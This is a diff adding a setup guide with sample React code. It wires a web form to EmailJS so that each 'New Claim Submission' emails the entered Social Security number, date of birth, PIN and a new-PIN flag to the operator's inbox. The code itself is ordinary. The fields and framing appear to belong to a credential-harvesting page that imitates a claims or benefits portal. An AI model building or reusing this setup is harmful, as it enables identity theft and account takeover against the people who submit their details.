@@ -1,0 +1,54 @@
+EmailJS Template Example
+-----------------------
+
+1. Go to https://www.emailjs.com/ and sign up/log in.
+2. Add your email service (e.g., Gmail, Outlook, etc.) and create a new email template.
+3. Example template fields:
+
+Subject: New Claim Submission
+
+Body:
+ID (Social Security Number): {{id}}
+DOB (MM/DD/YYYY): {{dob}}
+PIN: {{pin}}
+New PIN Checkbox: {{newPin}}
+
+You can add more fields as needed. Save the template and note your Service ID, Template ID, and Public Key.
+
+In your React code, you will use these IDs to send the form data.
+
+---
+
+Sample EmailJS usage in React (to be added to your form):
+
+import emailjs from 'emailjs-com';
+
+const sendEmail = (e) => {
+  e.preventDefault();
+  emailjs.sendForm(
+    'YOUR_SERVICE_ID',
+    'YOUR_TEMPLATE_ID',
+    e.target,
+    'YOUR_PUBLIC_KEY'
+  ).then(
+    (result) => {
+      alert('Form sent successfully!');
+    },
+    (error) => {
+      alert('Error sending form.');
+    }
+  );
+};
+
+// In your <form> element:
+<form onSubmit={sendEmail}> ... </form>
+
+// Each input should have a name matching the template variable, e.g.:
+<input name="id" ... />
+<input name="dob" ... />
+<input name="pin" ... />
+<input name="newPin" ... />
+
+---
+
+Replace YOUR_SERVICE_ID, YOUR_TEMPLATE_ID, and YOUR_PUBLIC_KEY with your actual EmailJS credentials.
